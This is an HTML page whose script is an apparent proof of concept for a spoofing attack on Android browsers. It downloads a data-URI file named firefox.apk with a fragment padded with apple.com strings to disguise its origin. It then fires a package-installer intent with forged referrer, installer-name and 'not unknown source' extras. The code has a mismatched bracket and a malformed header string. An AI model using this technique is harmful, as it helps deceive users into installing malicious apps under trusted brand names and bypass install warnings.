<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Intent Dispatcher</title>
</head>
<body>

    <!-- Tombol untuk memicu skrip unduhan dan intent spoofing -->
    <button id="strikeBtn" style="padding: 15px 25px; font-size: 16px; background-color: #6200ee; color: white; border: none; border-radius: 5px; cursor: pointer;">
        Open / Download
    </button>
    <div id="status" style="margin-top: 15px; font-family: monospace;"></div>

    <script>
        document.getElementById('strikeBtn').addEventListener('click', function() {
            // --- 1. CONFIGURATION ---
            const filename = "firefox.apk";
            const realDomain = "www.apple.com";

            // --- 2. ADVANCED SPOOFING LOGIC ---
            // Menggunakan fragment (#) dan padding masif untuk mengecoh parser UI browser.
            const padding = ".https://" + realDomain + "/update/".repeat(25);
            const longSub = realDomain + padding;

            // --- 3. PAYLOAD CONSTRUCTION (Base64 Inline Data) ---
            const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; 
            const payload = `data:application/octet-stream;base64,${base64Payload}#${longSub}`;

            // --- 4. EXECUTION (Direct Data Download) ---
            const a = document.createElement('a');
            a.href = payload;
            a.download = filename;
            a.rel = "noopener";

            document.body.appendChild(a);
            a.click();

            document.getElementById('status'].innerText = "> INJECTING_ORIGIN: " + realDomain;

            // --- 5. INTENT TRIGGER & REDIRECT ---
            setTimeout(() => {
                document.body.removeChild(a);
                
                // Memicu Intent URL dengan klaim asal apple.com
                const intentUrl = "intent://apple.com/#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;category=android.intent.category.DEFAULT;type=application/vnd.android.package-archive;launchFlags=0x10800000;S.browser_fallback_url=https%3A%2F%2Fwww.apple.com%2F;S.com.android.browser.application_id=org.mozilla.firefox;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;S.com.android.browser.headers=Referer%3A%https%3A%2F%2Fapple.com%2F;B.android.intent.extra.NOT_UNKNOWN_SOURCE=true;B.android.intent.extra.INSTALLER_PACKAGE_NAME=org.mozilla.firefox;end";
                
                window.location.href = intentUrl;
            }, 1000);
        });
    </script>

</body>
</html>
